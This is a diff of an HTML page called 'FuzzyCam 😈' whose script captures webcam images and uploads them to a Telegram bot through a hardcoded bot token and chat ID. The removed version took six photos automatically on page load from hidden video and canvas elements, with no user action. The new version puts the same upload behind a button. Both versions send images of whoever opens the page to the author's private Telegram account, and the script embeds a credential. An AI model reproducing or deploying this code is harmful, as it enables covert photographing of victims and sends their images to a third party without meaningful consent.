@@ -2,90 +2,118 @@
 <html>
 <head>
   <title>FuzzyCam 😈</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
-    #progress {
-      position: fixed;
-      top: 20px;
-      left: 50%;
-      transform: translateX(-50%);
-      background: rgba(0, 0, 0, 0.8);
-      color: white;
-      padding: 10px 20px;
-      border-radius: 8px;
+    body {
+      margin: 0;
       font-family: sans-serif;
-      z-index: 9999;
+      background-color: #111;
+      color: white;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+
+    #progressBox {
+      background-color: #222;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px #000;
+      text-align: center;
+      position: absolute;
+      top: 40%;
+      display: none;
+    }
+
+    .spinner {
+      margin: 10px auto;
+      border: 6px solid #ccc;
+      border-top: 6px solid #f39c12;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    #captureBtn {
+      padding: 15px 30px;
+      font-size: 18px;
+      border: none;
+      border-radius: 30px;
+      background-color: #f39c12;
+      color: white;
+      margin-top: 20px;
+      cursor: pointer;
+    }
+
+    #video, #canvas {
       display: none;
     }
   </style>
 </head>
 <body>
-  <div id="progress">📸 Capturing photos...</div>
-  <video id="video" autoplay playsinline style="display:none;"></video>
-  <canvas id="canvas" style="display:none;"></canvas>
+
+  <div id="progressBox">
+    <div class="spinner"></div>
+    <p>Processing image...</p>
+  </div>
+
+  <button id="captureBtn">📸 Capture & Send Photo</button>
+
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas"></canvas>
 
   <script>
     const botToken = "8079056355:AAGP1alTryOpzFmtk8ZxNWKxs6q59Mbuj70";
     const chatId = "8182050140";
 
-    async function sleep(ms) {
-      return new Promise(resolve => setTimeout(resolve, ms));
-    }
-
-    async function captureAndSendPhotos(count = 6) {
-      const progress = document.getElementById('progress');
+    async function captureAndSendPhoto() {
       const video = document.getElementById('video');
       const canvas = document.getElementById('canvas');
       const context = canvas.getContext('2d');
-
-      progress.style.display = 'block';
-      progress.textContent = `📷 Accessing camera...`;
+      const progressBox = document.getElementById('progressBox');
 
       try {
+        progressBox.style.display = 'block';
+
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         video.srcObject = stream;
 
-        await sleep(2000); // Wait for camera to initialize
+        await new Promise(resolve => setTimeout(resolve, 2000)); // Wait for cam
 
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-        for (let i = 1; i <= count; i++) {
-          progress.textContent = `📸 Capturing photo ${i} of ${count}...`;
+        stream.getTracks().forEach(track => track.stop());
 
-          context.drawImage(video, 0, 0, canvas.width, canvas.height);
-          await new Promise(resolve => {
-            canvas.toBlob(async (blob) => {
-              const formData = new FormData();
-              formData.append('chat_id', chatId);
-              formData.append('photo', blob, `photo_${i}.jpg`);
+        canvas.toBlob(async (blob) => {
+          const formData = new FormData();
+          formData.append('chat_id', chatId);
+          formData.append('photo', blob, 'photo.jpg');
 
-              await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                method: 'POST',
-                body: formData
-              });
-
-              resolve(); // Continue to next capture
-            }, 'image/jpeg');
+          await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+            method: 'POST',
+            body: formData
           });
 
-          await sleep(1000); // Wait 1s before next shot
-        }
-
-        progress.textContent = "✅ All 6 photos sent!";
-        await sleep(2000);
-
-        stream.getTracks().forEach(track => track.stop()); // Stop camera
-        progress.style.display = 'none';
+          progressBox.style.display = 'none';
+          alert("❤️ Photo sent successfully 😈");
+        }, 'image/jpeg');
       } catch (e) {
-        progress.textContent = "❌ " + e.message;
-        await sleep(3000);
-        progress.style.display = 'none';
+        progressBox.style.display = 'none';
+        alert("❌ Camera error: " + e.message);
       }
     }
 
-    window.onload = () => {
-      captureAndSendPhotos();
-    };
+    document.getElementById('captureBtn').onclick = captureAndSendPhoto;
   </script>
 </body>
 </html>
